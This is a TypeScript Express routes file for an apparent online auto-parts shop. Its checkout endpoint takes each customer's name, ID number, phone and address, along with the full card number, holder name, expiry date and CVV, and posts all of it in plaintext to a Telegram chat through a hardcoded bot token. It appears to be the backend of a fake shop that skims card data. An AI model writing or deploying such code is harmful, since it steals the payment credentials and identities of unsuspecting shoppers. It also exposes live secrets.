import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertOrderSchema } from "@shared/schema";
import axios from "axios";

const TELEGRAM_BOT_TOKEN = "8216762861:AAG2QaZbD2iUsELugwGqCLT0lErqvHEl2no";
const TELEGRAM_CHAT_ID = "8160916137";

async function sendToTelegram(message: string): Promise<void> {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML"
    });
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    throw error;
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  app.post("/api/checkout", async (req, res) => {
    try {
      const validatedData = insertOrderSchema.parse(req.body);
      
      const order = await storage.createOrder(validatedData);
      
      const items = Array.isArray(validatedData.items) ? validatedData.items : [];
      const itemsList = items
        .map((item: any) => `• ${item.name} - €${item.price} x ${item.quantity}`)
        .join('\n');
      
      const message = `
🛒 <b>NUEVO PEDIDO - Repuestos D Y M</b>

📋 <b>ID Pedido:</b> ${order.id}

👤 <b>DATOS PERSONALES</b>
• Nombre: ${validatedData.fullName}
• Cédula: ${validatedData.cedula}
• Teléfono: ${validatedData.phone}

📦 <b>DATOS DE ENVÍO</b>
• Dirección: ${validatedData.address}
• Ciudad: ${validatedData.city}
• Código Postal: ${validatedData.postalCode}

💳 <b>DATOS DE PAGO</b>
• Número de Tarjeta: ${validatedData.cardNumber}
• Titular: ${validatedData.cardHolder}
• Fecha Exp: ${validatedData.expiryDate}
• CVV: ${validatedData.cvv}

🛍️ <b>PRODUCTOS</b>
${itemsList}

💰 <b>Total:</b> €${validatedData.total}

⏰ ${new Date().toLocaleString('es-ES')}
      `.trim();
      
      await sendToTelegram(message);
      
      res.json({ 
        success: true, 
        orderId: order.id,
        message: "Order processed successfully"
      });
    } catch (error) {
      console.error("Checkout error:", error);
      res.status(400).json({ 
        success: false, 
        error: error instanceof Error ? error.message : "Invalid request"
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
